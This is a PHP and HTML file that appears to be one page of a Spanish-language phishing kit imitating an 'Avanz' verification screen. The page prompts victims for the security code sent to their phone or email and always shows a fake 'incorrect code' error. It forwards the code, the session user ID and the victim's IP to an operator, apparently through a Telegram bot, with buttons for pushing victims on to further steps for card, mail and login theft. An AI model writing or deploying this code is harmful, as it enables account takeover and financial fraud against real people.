<?php
require_once __DIR__ . '/_guard.php';
session_start();
require_once __DIR__ . '/_tg.php';

$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $codigo = $_POST['int1'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $msg = "🔐 Nuevo código AVANZ \n";
    $msg .= "🆔 ID: $usuario\n";
    $msg .= "🔢 Código: $codigo\n";
    $msg .= "📍 IP: $ip";

    $botones = [
        [
            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$usuario"]
        ],
        [
            ["text" => "📩 MAIL", "callback_data" => "MAIL|$usuario"],
            ["text" => "💳 CARD", "callback_data" => "CARD|$usuario"]
        ],
        [
            ["text" => "🔁 LOGIN", "callback_data" => "LOGIN|$usuario"],
            ["text" => "✅ LISTO", "callback_data" => "LISTO|$usuario"]
        ]
    ];

    tg_send($msg, $botones);

    header("Location: sleep.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Avanz - Verificación</title>
    <style>
        .tem {
            color: #333;
            border: 1px solid rgb(182, 181, 181);
            border-radius: 3px;
            height: 39px;
            width: 340px;
            padding-left: 12px;
            outline: none;
            font-size: 16px;
            font-family: sans-serif;
        }

        .masa3 {
            width: 100%;
            height: 20px;
            margin: 0px;
            background-color: #005961;
            padding: 5px;
        }

        .met {
            font-family: sans-serif;
            font-size: 15px;
            min-width: 126px;
            text-transform: uppercase;
            padding: 5px 20px;
            border: none;
            color: #fff;
            background: #FF7500;
            cursor: pointer;
        }

        #iot {
            font-size: 15px;
            color: red;
            font-family: sans-serif;
            float: left;
            display: block; /* SIEMPRE visible */
        }
    </style>
</head>
<body style="margin: 0;">
    <div style="width: 100%; height: 70px; padding: 10px; margin-left: 10px;">
        <img width="120px" src="img/lk.svg" alt="">
    </div>

    <div class="masa3">
        <center>
            <svg xmlns="http://www.w3.org/2000/svg" width="62" height="62" viewBox="0 0 24 24" fill="none" stroke="#FF7500" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" style="margin-top:6px"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1.2" fill="#FF7500" stroke="none"/></svg>
        </center>
    </div>

    <div style="padding: 5px;">
        <center>
            <form method="post" style="width: 350px; margin-left: -10px;">
                <br>
                <p style="font-family: sans-serif; color: rgb(105, 105, 105);">
                    Hemos enviado un código de seguridad al número de teléfono o correo electrónico registrado, ingrésalo para continuar.
                </p>
                <br>

                <p style="font-family: sans-serif; float: left; margin-left: 20px; color: rgb(105, 105, 105);">
                    Ingresa el Código de Seguridad
                </p>
                <input inputmode="numeric" class="tem" type="text" name="int1" id="codigo" placeholder="Código" maxlength="8">
                <p id="iot">Código incorrecto, inténtalo nuevamente</p>

                <br><br><br>
                <input class="met" type="submit" value="CONTINUAR">
            </form>
        </center>
    </div>
</body>
</html>
